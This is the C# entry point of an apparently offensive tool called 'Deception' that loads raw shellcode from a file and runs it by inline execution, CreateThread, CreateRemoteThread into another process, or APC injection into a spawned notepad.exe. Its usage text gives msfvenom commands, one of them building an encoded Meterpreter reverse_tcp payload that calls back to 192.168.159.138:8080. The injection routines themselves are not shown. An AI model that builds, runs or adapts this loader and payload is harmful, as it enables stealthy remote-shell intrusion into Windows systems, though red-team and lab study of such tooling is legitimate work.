using Utils;
using Services;
using Models;
using Modules;

using System;
using System.Text;
using System.IO;
using System.Linq;

namespace Deception
{
   class Program
   {
      static void Main(string[] args)
      {
         // Check Args
         if (args.Length < 2)
         {
            Usage();
            System.Environment.Exit(0);
         }

         // Set Args
         string file = args[0];
         if (!File.Exists(file))
         {
            WriteService.ErrorExit("Cannot find file: " + args[0]);
         }

         // Generate
         if (args[1] == "-i")
         {
            // type = (int)Types.Inline;            
            DeceptionService.Run(file, new Inline());            
         }
         else if (args[1] == "-t")
         {
            // type = (int)Types.Inline_NewThread;
            DeceptionService.Run(file, new Inline_NewThread());
         }
         else if (args[1] == "-r")
         {
            // type = (int)Types.Remote_CreateRemoteThread;
            DeceptionService.Run(file, new Remote_CreateRemoteThread());
         }
         else if (args[1] == "-s")
         {
            // type = (int)Types.Remote_Spawn_QueueAPC;
            DeceptionService.Run(file, new Spawn_QueueAPC());
         }
         else if (args[1] == "-a")
         {
            DeceptionService.Run(file, new Inline());            
            DeceptionService.Run(file, new Inline_NewThread());
            DeceptionService.Run(file, new Remote_CreateRemoteThread());
            DeceptionService.Run(file, new Spawn_QueueAPC());            
         }
         else
         {
            Usage();
         }
      }
      
      private static void Usage()
      {
         Console.ForegroundColor = ConsoleColor.Yellow;
         Console.WriteLine("Usage: ");
         Console.WriteLine("  ./Deception.exe msf.bin -i       # for inline");
         Console.WriteLine("  ./Deception.exe msf.bin -t       # for inline: CreateThread");
         Console.WriteLine("  ./Deception.exe msf.bin -r       # for remote: CreateRemoteThread via given PID");
         Console.WriteLine("  ./Deception.exe msf.bin -s       # for remote: Spawn notepad.exe and Queue APC inject");
         Console.WriteLine("  ./Deception.exe msf.bin -a       # makes all of the above");         
         Console.WriteLine("Payload Examples: ");
         Console.WriteLine("   msfbin: msfvenom -p windows/x64/exec -f raw CMD=calc.exe -o msf.bin");
         Console.WriteLine("   msfbin: msfvenom -p windows/x64/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 LHOST=192.168.159.138 LPORT=8080 -f raw -o msf.bin");
         System.Environment.Exit(0);
      }
   }
}
